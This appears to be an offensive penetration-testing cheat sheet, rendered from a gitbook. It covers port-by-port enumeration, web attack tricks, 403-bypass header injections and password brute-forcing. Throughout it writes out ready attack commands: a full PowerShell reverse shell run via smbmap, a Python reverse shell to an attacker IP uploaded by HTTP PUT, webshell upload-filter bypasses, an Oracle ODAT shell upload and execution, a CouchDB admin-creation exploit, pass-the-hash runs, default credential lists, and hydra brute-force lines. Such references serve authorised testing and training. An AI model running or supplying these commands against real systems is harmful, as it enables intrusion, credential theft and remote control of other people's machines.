</div><div class="table-wrapper"><table><thead><tr><th>winreg</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winreg.html">winreg</a> interface (Remote registry service)</th><th>RemoteRegistry</th><th>338cd001-2244-31f1-aaaa-900038001003 v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>winspipe</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winsif.html">winsif</a> interface (WINS service)</th><th>wins.exe</th><th>45f52c28-7f9f-101a-b52b-08002b2efabe v1.0</th></tr></thead><tbody>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>wkssvc (ntsvcs alias)</th><th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_wkssvc.html">wkssvc</a> interface (Workstation service)</th><th>services.exe (w2k) or svchost.exe (wxp and w2k3)</th><th>6bffd098-a112-3610-9833-46c3f87e345a v1.0</th></tr></thead><tbody>
</tbody></table>
</div>
<h2 id="port-139445---smb"><a class="header" href="#port-139445---smb">Port 139/445 - SMB</a></h2>
<pre><code class="language-bash"># Enum hostname
enum4linux -n 10.11.1.111
nmblookup -A 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111

# Get Version
smbver.sh 10.11.1.111
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 
smbclient -L \\\\10.11.1.111

# Get Shares
smbmap -H  10.11.1.111 -R 
echo exit | smbclient -L \\\\10.11.1.111
smbclient \\\\10.11.1.111\\
smbclient -L //10.11.1.111 -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
smbclient -L \\\\10.11.1.111\\
# If got error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
smbclient -L //10.11.1.111/ --option='client min protocol=NT1'

# Check null sessions
smbmap -H 10.11.1.111
rpcclient -U "" -N 10.11.1.111
smbclient //10.11.1.111/IPC$ -N

# Exploit null sessions
enum -s 10.11.1.111
enum -U 10.11.1.111
enum -P 10.11.1.111
enum4linux -a 10.11.1.111
#https://github.com/cddmp/enum4linux-ng/
enum4linux-ng.py 10.11.1.111 -A -C
/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111

# Connect to username shares
smbclient //10.11.1.111/share -U username

# Connect to share anonymously
smbclient \\\\10.11.1.111\\
smbclient //10.11.1.111/
smbclient //10.11.1.111/
smbclient //10.11.1.111/&lt;""share name""&gt;
rpcclient -U " " 10.11.1.111
rpcclient -U " " -N 10.11.1.111

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run

# Bruteforce login
medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
nmap –script smb-brute 10.11.1.111

# nmap smb enum &amp; vuln 
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# rpcclient commands
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

# smbmap
smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&amp;pass "gpp-decrypt "

# CrackMapExec
crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local
crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local --lsa

# Impacket
python3 samdump.py SMB 172.21.0.0

# Check for systems with SMB Signing not enabled
python3 RunFinger.py -i 172.21.0.0/24
</code></pre>
<h2 id="port-161162-udp---snmp"><a class="header" href="#port-161162-udp---snmp">Port 161/162 UDP - SNMP</a></h2>
<pre><code class="language-bash">nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
nmap 10.11.1.111 -Pn -sU -p 161 --script=snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users
snmp-check 10.11.1.111 -c public|private|community
snmpwalk -c public -v1 ipaddress 1
snmpwalk -c private -v1 ipaddress 1
snmpwalk -c manager -v1 ipaddress 1
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 172.21.0.X

# Impacket
python3 samdump.py SNMP 172.21.0.0 

# MSF aux modules
 auxiliary/scanner/misc/oki_scanner                                    
 auxiliary/scanner/snmp/aix_version                                   
 auxiliary/scanner/snmp/arris_dg950                                   
 auxiliary/scanner/snmp/brocade_enumhash                               
 auxiliary/scanner/snmp/cisco_config_tftp                               
 auxiliary/scanner/snmp/cisco_upload_file                              
 auxiliary/scanner/snmp/cnpilot_r_snmp_loot                             
 auxiliary/scanner/snmp/epmp1000_snmp_loot                             
 auxiliary/scanner/snmp/netopia_enum                                    
 auxiliary/scanner/snmp/sbg6580_enum                                 
 auxiliary/scanner/snmp/snmp_enum                                 
 auxiliary/scanner/snmp/snmp_enum_hp_laserjet                           
 auxiliary/scanner/snmp/snmp_enumshares                                
 auxiliary/scanner/snmp/snmp_enumusers                                 
 auxiliary/scanner/snmp/snmp_login
</code></pre>
<h2 id="port-389636---ldap"><a class="header" href="#port-389636---ldap">Port 389,636 - LDAP</a></h2>
<p>Check <a href="enumeration/../post-exploitation/windows/ad/">AD</a> section and this <a href="https://malicious.link/post/2022/ldapsearch-reference/">LDAP</a> guide</p>
<pre><code class="language-bash">jxplorer
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
python3 windapsearch.py --dc-ip 10.10.10.182 --users --full &gt; windapsearch_users.txt
cat windapsearch_users.txt | grep sAMAccountName | cut -d " " -f 2 &gt; users.txt
# Check # https://github.com/ropnop/go-windapsearch
</code></pre>
<h2 id="port-443---https"><a class="header" href="#port-443---https">Port 443 - HTTPS</a></h2>
<p>Read the actual SSL CERT to:</p>
<ul>
<li>find out potential correct vhost to GET</li>
<li>is the clock skewed</li>
<li>any names that could be usernames for bruteforce/guessing.</li>
</ul>
<pre><code class="language-bash">./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST &gt; OUTPUT-FILE.html
# Check for mod_ssl,OpenSSL version Openfuck
</code></pre>
<h2 id="port-500---isakmp-ike"><a class="header" href="#port-500---isakmp-ike">Port 500 - ISAKMP IKE</a></h2>
<pre><code>ike-scan 10.11.1.111
</code></pre>
<h2 id="port-513---rlogin"><a class="header" href="#port-513---rlogin">Port 513 - Rlogin</a></h2>
<pre><code>apt install rsh-client
rlogin -l root 10.11.1.111
</code></pre>
<h2 id="port-541---fortinet-sslvpn"><a class="header" href="#port-541---fortinet-sslvpn">Port 541 - FortiNet SSLVPN</a></h2>
<p><a href="https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png">Fortinet Ports Guide</a></p>
<p><a href="https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ">SSL VPN Leak</a></p>
<h2 id="port-1433---mssql"><a class="header" href="#port-1433---mssql">Port 1433 - MSSQL</a></h2>
<pre><code class="language-bash">nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
    xp_cmdshell 'date'
      go


EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'

https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
</code></pre>
<h2 id="port-1521---oracle"><a class="header" href="#port-1521---oracle">Port 1521 - Oracle</a></h2>
<pre><code class="language-bash">oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

# https://github.com/quentinhardy/odat
./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

# Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

# and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
</code></pre>
<h2 id="port-2000---cisco-sccp"><a class="header" href="#port-2000---cisco-sccp">Port 2000 - Cisco sccp</a></h2>
<pre><code class="language-bash"># cisco-audit-tool
CAT -h ip -p 2000 -w /usr/share/wordlists/rockyou.txt 

# cisco-smart-install
https://github.com/Sab0tag3d/SIET/
sudo python siet.py -g -i 192.168.0.1
</code></pre>
<h2 id="port-2049---nfs"><a class="header" href="#port-2049---nfs">Port 2049 - NFS</a></h2>
<pre><code class="language-bash">nmap -p 111,2049 --script nfs-ls,nfs-showmount

showmount -e 10.11.1.111

# If you find anything you can mount it like this:

mount 10.11.1.111:/ /tmp/NFS –o nolock
mount -t nfs 10.11.1.111:/ /tmp/NFS –o nolock
</code></pre>
<h2 id="port-2100---oracle-xml-db"><a class="header" href="#port-2100---oracle-xml-db">Port 2100 - Oracle XML DB</a></h2>
<p>Default passwords:</p>
<p><a href="https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm">https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</a></p>
<h2 id="port-3306---mysql"><a class="header" href="#port-3306---mysql">Port 3306 - MySQL</a></h2>
<pre><code class="language-bash">nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

# MYSQL UDF 4.x/5.0
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
</code></pre>
<h2 id="port-3389---rdp"><a class="header" href="#port-3389---rdp">Port 3389 - RDP</a></h2>
<pre><code class="language-bash">nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
python crowbar.py -b rdp -s 10.11.1.111/32 -u admin -C ../rockyou.txt -v
</code></pre>
<h2 id="port-5432---postgresql"><a class="header" href="#port-5432---postgresql">Port 5432 - PostgreSQL</a></h2>
<pre><code class="language-bash">psql -h 10.10.1.111 -U postgres -W

# Default creds
postgres : postgres
postgres : password
postgres : admin
admin : admin
admin : password

pg_dump --host=10.10.1.111 --username=postgres --password --dbname=template1 --table='users' -f output_pgdump
</code></pre>
<h2 id="port-5900---vnc"><a class="header" href="#port-5900---vnc">Port 5900 - VNC</a></h2>
<pre><code class="language-bash">nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
</code></pre>
<h2 id="port-5984---couchdb"><a class="header" href="#port-5984---couchdb">Port 5984 - CouchDB</a></h2>
<pre><code class="language-bash">curl http://example.com:5984/
curl -X GET http://IP:5984/_all_dbs
curl -X GET http://user:password@IP:5984/_all_dbs

# CVE-2017-12635 RCE

# Create user
curl -X PUT ‘http://localhost:5984/_users/org.couchdb.user:chenny' — data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’

# Dump database
curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword &lt;ds/_all_docs?include_docs=true -u chenny:-Xpassword

# Dump passwords
curl -X GET http://user:passwords@localhost:5984/passwords
</code></pre>
<h2 id="port-5985---winrm"><a class="header" href="#port-5985---winrm">Port 5985 - WinRM</a></h2>
<pre><code class="language-bash"># https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
</code></pre>
<h2 id="port-6379---redis"><a class="header" href="#port-6379---redis">Port 6379 - Redis</a></h2>
<pre><code class="language-bash"># https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
</code></pre>
<h2 id="port-8172---msdeploy"><a class="header" href="#port-8172---msdeploy">Port 8172 - MsDeploy</a></h2>
<pre><code class="language-bash"># Microsoft IIS Deploy port
IP:8172/msdeploy.axd
</code></pre>
<h2 id="port-56019200"><a class="header" href="#port-56019200">Port 5601/9200</a></h2>
<p><a href="enumeration/webservices/elk.html">ELK</a></p>
<h2 id="port-27017-192708028017---mongodb"><a class="header" href="#port-27017-192708028017---mongodb">Port 27017-19/27080/28017 - MongoDB</a></h2>
<p><a href="enumeration/webservices/nosql-and-and-mongodb.html">MongoDB</a></p>
<h2 id="unknown-ports"><a class="header" href="#unknown-ports">Unknown ports</a></h2>
<ul>
<li><code>amap -d 10.11.1.111 8000</code></li>
<li>netcat: makes connections to ports. Can echo strings or give shells: <code>nc -nv 10.11.1.111 110</code></li>
<li>sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, using basic HTTP configurations</li>
</ul>
<h2 id="rce-ports"><a class="header" href="#rce-ports">RCE ports</a></h2>
<p><img src="enumeration/../.gitbook/assets/image%20(1).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-attacks"><a class="header" href="#web-attacks">Web Attacks</a></h1>
<p><strong>Check out in the left submenu what common attack you want review</strong></p>
<p><img src="enumeration/web/../../.gitbook/assets/y7ipicwvp5d41%5B1%5D.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="general-info"><a class="header" href="#general-info">General Info</a></h1>
<h2 id="auth-headers"><a class="header" href="#auth-headers">Auth headers</a></h2>
<pre><code class="language-bash"># Basic Auth (B64)
Authorization: Basic AXVubzpwQDU1dzByYM==
# Bearer Token (JWT)
Authorization: Bearer &lt;token&gt;
# API Key
GET /endpoint?api_key=abcdefgh123456789
X-API-Key: abcdefgh123456789
# Digest Auth
Authorization: Digest username=”admin” Realm=”abcxyz” nonce=”474754847743646”, uri=”/uri” response=”7cffhfr54685gnnfgerg8”
# OAuth2.0
Authorization: Bearer hY_9.B5f-4.1BfE
# Hawk Authentication
Authorization: Hawk id="abcxyz123", ts="1592459563", nonce="gWqbkw", mac="vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU="
# AWS signature
Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_
</code></pre>
<h2 id="common-checks"><a class="header" href="#common-checks">Common checks</a></h2>
<pre><code class="language-bash"># robots.txt
curl http://example.com/robots.txt
# headers
wget --save-headers http://www.example.com/
    # Strict-Transport-Security (HSTS)
    # X-Frame-Options: SAMEORIGIN
    # X-XSS-Protection: 1; mode=block
    # X-Content-Type-Options: nosniff
# Cookies
    # Check Secure and HttpOnly flag in session cookie
    # If exists BIG-IP cookie, app behind a load balancer
# SSL Ciphers
nmap --script ssl-enum-ciphers -p 443 www.example.com
# HTTP Methods
nmap -p 443 --script http-methods www.example.com
# Cross Domain Policy
curl http://example.com/crossdomain.xml
    # allow-access-from domain="*"

# Cookies explained
https://cookiepedia.co.uk/
</code></pre>
<h2 id="security-headers-explanation"><a class="header" href="#security-headers-explanation">Security headers explanation</a></h2>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(11).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="quick-tricks"><a class="header" href="#quick-tricks">Quick tricks</a></h1>
<pre><code class="language-bash"># Web ports for nmap
80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672

# Technology scanner
# https://github.com/urbanadventurer/WhatWeb
whatweb htttps://url.com

# Screenshot web
# https://github.com/maaaaz/webscreenshot
# https://github.com/sensepost/gowitness
# https://github.com/michenriksen/aquatone

# Get error with in input
%E2%A0%80%0A%E2%A0%80

# Retrieve additional info:
/favicon.ico/..%2f
/lol.png%23
/../../../
?debug=1
/server-status
/files/..%2f..%2f

# Change default header to accept */*
Accept: application/json, text/javascript, */*; q=0.01

# Sitemap to wordlist (httpie)
http https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|&lt;/?loc&gt;||g' &gt; wordlist_endpoints.txt

# Bypass Rate Limits:
# Use different params: 
    sign-up, Sign-up, SignUp
# Null byte on params:
    %00, %0d%0a, %09, %0C, %20, %0

# Bypass upload restrictions:
# Change extension: .pHp3 or pHp3.jpg
# Modify mimetype: Content-type: image/jpeg
# Bypass getimagesize(): exiftool -Comment='"; system($_GET['cmd']); ?&gt;' file.jpg
# Add gif header: GIF89a;
# All at the same time.

# ImageTragic (memory leaks in gif preview)
# https://github.com/neex/gifoeb
./gifoeb gen 512x512 dump.gif
# Upload dump.gif multiple times, check if preview changes.
# Check docs for exploiting

# If upload from web is allowed or :
# https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
# https://iplogger.org/invisible/
# https://iplogger.org/15bZ87

# Check HTTP options:
# Check if it is possible to upload
curl -v -k -X OPTIONS https://10.11.1.111/
# If put enabled, upload:
curl -v -X PUT -d '' http://10.11.1.111/test/shell.php
nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
curl -v -X PUT -d '' http://VICTIMIP/test/cmd.php &amp;&amp; http://VICTIMIP/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22ATTACKERIP%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://VICTIMIP:8585/uploads/meterpreter.php
# If PUT is not allowed, try to override:
X-HTTP-Method-Override: PUT
X-Method-Override: PUT

# Retrieve endpoints
# LinkFinder
# https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i https://example.com -d
python linkfinder.py -i burpfile -b

# Retreive hidden parameters
# Tools
# https://github.com/s0md3v/Arjun
python3 arjun.py -u https://url.com --get 
python3 arjun.py -u https://url.com --post
# https://github.com/maK-/parameth
python parameth.py -u https://example.com/test.php
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py --domain example.com
# https://github.com/s0md3v/Parth
python3 parth.py -t example.com

# .DS_Store files?
# https://github.com/gehaxelt/Python-dsstore
python main.py samples/.DS_Store.ctf

# Polyglot RCE payload
1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}

# Nmap web scan
nmap --script "http-*" example.com -p 443

# SQLi + XSS + SSTI
'"&gt;&lt;svg/onload=prompt(5);&gt;{{7*7}}
' ==&gt; for Sql injection 
"&gt;&lt;svg/onload=prompt(5);&gt; ==&gt; for XSS 
{{7*7}} ==&gt; for SSTI/CSTI

# Try to connect with netcat to port 80
nc -v host 80

# Understand URL params with unfurl
https://dfir.blog/unfurl/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="header-injections"><a class="header" href="#header-injections">Header injections</a></h1>
<h2 id="headers"><a class="header" href="#headers">Headers</a></h2>
<pre><code class="language-bash"># Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
Client-IP:
Connection:
Contact:
Forwarded:
From:
Host:
Origin:
Referer:
True-Client-IP:
X-Client-IP:
X-Custom-IP-Authorization:
X-Forward-For:
X-Forwarded-For:
X-Forwarded-Host:
X-Forwarded-Server:
X-Host:
X-Original-URL:
X-Originating-IP:
X-Real-IP:
X-Remote-Addr:
X-Remote-IP:
X-Rewrite-URL:
X-Wap-Profile:

# Try to repeat same Host header 2 times
Host: legit.com
Stuff: stuff
Host: evil.com

# Bypass type limit
Accept: application/json, text/javascript, */*; q=0.01
Accept: ../../../../../../../../../etc/passwd{{'

# Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header

# 401/403 bypasses 
# Whitelisted IP 127.0.0.1 or localhost
Client-IP: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For: localhost
Forwarded: 127.0.0.1
Forwarded: localhost
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forward: 127.0.0.1
X-Forward: localhost
X-Forwarded-By: 127.0.0.1
X-Forwarded-By: localhost
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Original: localhost
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Server: localhost
X-Forwarded: 127.0.0.1
X-Forwarded: localhost
X-Forwared-Host: 127.0.0.1
X-Forwared-Host: localhost
X-Host: 127.0.0.1
X-Host: localhost
X-HTTP-Host-Override: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Addr: localhost
X-Remote-IP: 127.0.0.1

# Fake Origin - make GET request to accesible endpoint with:
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
# Also try with absoulte url https:/domain.com/admin

# Method Override
X-HTTP-Method-Override: PUT

# Provide full path GET
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com

# Add line wrapping
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com

# Wordlists
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers
</code></pre>
<h2 id="tools-2"><a class="header" href="#tools-2">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/lobuhi/byp4xx
./byp4xx.sh https://url/path
# https://github.com/OdinF13/Bug-Bounty-Scripts

# https://github.com/mlcsec/headi
headi -url http://target.com/admin
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bruteforcing"><a class="header" href="#bruteforcing">Bruteforcing</a></h1>
<pre><code class="language-bash">cewl
hash-identifier
# https://github.com/HashPals/Name-That-Hash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
hydra -L username.txt -p paswordl33t -t 4 ssh://10.10.1.111
hydra -L user.txt -P pass.txt 10.10.1.111 ftp

# PATATOR
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&amp;password=^PASS^&amp;Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&amp;password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=-120&amp;User=^USER^&amp;Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&amp;password=^PASS^:Bad credentials" -t 64

# Password spraying bruteforcer
# https://github.com/x90skysn3k/brutespray
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5

# Password generator
# https://github.com/edoardottt/longtongue
python3 longtongue.py

https://many-passwords.github.io/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="online-hashes-cracked"><a class="header" href="#online-hashes-cracked">Online hashes cracked</a></h1>
<pre><code class="language-bash">https://www.cmd5.org/
http://hashes.org
